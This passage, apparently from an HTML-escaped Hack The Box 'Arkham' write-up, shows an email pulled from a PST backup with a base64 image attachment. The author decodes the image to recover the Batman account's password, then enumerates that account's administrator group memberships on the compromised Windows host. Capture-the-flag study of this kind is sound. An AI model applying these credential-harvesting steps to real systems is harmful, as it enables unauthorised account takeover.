+&amp;lt;/o:shapelayout&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;![endif]--&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=EN-US link=&quot;#0563C1&quot; vlink=&quot;#954F72&quot; style='tab-interval:.5in'&amp;gt;&amp;lt;div class=WordSection1&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;Master Wayne stop forgetting your password&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;span style='mso-no-proof:yes'&amp;gt;&amp;lt;img width=677 height=343 id=&quot;Picture_x0020_1&quot; src=&quot;cid:image001.png@01D4BB4A.F5061EA0&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+----boundary-LibPST-iamunique-672158152_-_-
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-ID: &amp;lt;image001.png@01D4BB4A.F5061EA0&amp;gt;
+Content-Disposition: attachment; 
+        filename*=utf-8''image001.png;
+        filename=&quot;image001.png&quot;
+
+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
+AQIE5hP4/wjr8uh7Wbf/AAAAAElFTkSuQmCC
+
+
+----boundary-LibPST-iamunique-672158152_-_---
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-see-two-interesting-things-here-first-one-is-this-message--master-wayne-stop-forgetting-your-password-and-second-one-is-the-base-64-encoded-image-i-decoded-it-and-saved-it-&quot;&gt;We can see two interesting things here, first one is this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne stop forgetting your password&lt;/code&gt; and second one is the base-64 encoded image. I decoded it and saved it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nano image001.png.b64
+root@kali:~/Desktop/HTB/boxes/arkham/backups# base64 -d image001.png.b64 &amp;gt; image001.png
+root@kali:~/Desktop/HTB/boxes/arkham/backups# file image001.png
+image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
+root@kali:~/Desktop/HTB/boxes/arkham/backups# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;image001png-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;image001.png&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great-we-have-the-password-for-batman-by-checking-the-local-group-memberships-of-batman-we-can-see-that-batman-is-in-the-administrators-group-and-also-in-the-remote-management-users-group-&quot;&gt;Great, we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt;. By checking the local group memberships of &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, and also in the Remote management users group :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net user batman
+net user batman
+User name                    Batman
+Full Name
+Comment
+User's comment
+Country/region code          001 (United States)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/3/2019 9:25:51 AM
+Password expires             Never
+Password changeable          2/3/2019 9:25:51 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   8/10/2019 1:29:47 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+C:\&amp;gt;
